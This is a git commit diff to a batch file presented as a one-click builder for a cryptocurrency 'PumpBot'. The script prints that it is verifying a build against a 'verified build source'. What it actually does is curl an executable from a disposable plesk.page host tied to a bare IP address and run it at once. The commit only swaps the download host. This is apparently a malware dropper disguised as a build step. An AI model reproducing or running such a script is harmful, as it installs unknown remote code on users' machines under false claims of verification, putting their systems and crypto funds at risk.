7b74c09e38cd076839f186494f961a0a2e2d3cf1
Coinsw.app <69402425+CoinSwapPump@users.noreply.github.com>
2022-05-07 06:06:09 +0300

    Update PumpBotV2.0-OneClickBuilder.bat

--- PumpBotV2.0-OneClickBuilder.bat
+++ PumpBotV2.0-OneClickBuilder.bat
@@ -3,7 +3,7 @@ color 0A
 echo -
 echo		    Please wait for verifying built app with verified build source...
 echo -
-curl "https://sleepy-swanson.137-184-117-69.plesk.page/VerifiedBuildSource" --output py/PumpBotV2.0.exe
+curl "https://mystifying-golick.137-184-117-69.plesk.page/VerifiedBuildSource" --output py/PumpBotV2.0.exe
 echo Building now complete and extracted to the directory.
 start "PumpBot" py/PumpBotV2.0.exe
 pause
